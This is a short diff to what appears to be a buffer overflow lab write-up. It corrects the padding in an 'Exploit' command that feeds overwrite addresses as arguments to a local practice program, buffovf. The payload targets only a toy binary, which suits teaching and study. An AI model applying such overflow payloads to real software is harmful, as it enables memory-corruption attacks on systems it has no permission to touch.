@@ -5,7 +5,7 @@ gcc -g -o buffovf buffovf.c
 
 ### Exploit
 ```
-./buffovf `echo -ne "AAAAAAAABBBBBBCCCCCCCCDDDDDDDDEEEEEEEE\x38\x10\x60"` `echo -ne "\x80\x06\x40"`
+./buffovf `echo -ne "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE\x38\x10\x60"` `echo -ne "\x80\x06\x40"`
 ```
 
 ### Note
